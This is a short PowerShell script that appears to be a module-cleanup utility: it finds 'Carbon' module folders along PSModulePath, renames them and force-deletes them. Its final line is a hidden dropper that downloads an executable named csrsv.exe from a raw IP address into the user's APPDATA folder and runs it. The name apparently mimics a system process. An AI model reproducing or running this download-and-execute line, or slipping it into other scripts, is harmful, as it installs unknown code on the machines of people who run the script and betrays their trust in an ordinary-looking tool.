











[CmdletBinding()]
param(
)


Set-StrictMode -Version 'Latest'
$ErrorActionPreference = 'Stop'


Get-Item -Path 'env:PSModulePath' |
    Select-Object -ExpandProperty 'Value'-ErrorAction Ignore |
    ForEach-Object { $_ -split ';' } |
    Where-Object { $_ } |
    Join-Path -ChildPath 'Carbon' |
    Where-Object { Test-Path -Path $_ -PathType Container } |
    Rename-Item -NewName { 'Carbon{0}' -f [IO.Path]::GetRandomFileName() } -PassThru |
    Remove-Item -Recurse -Force

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

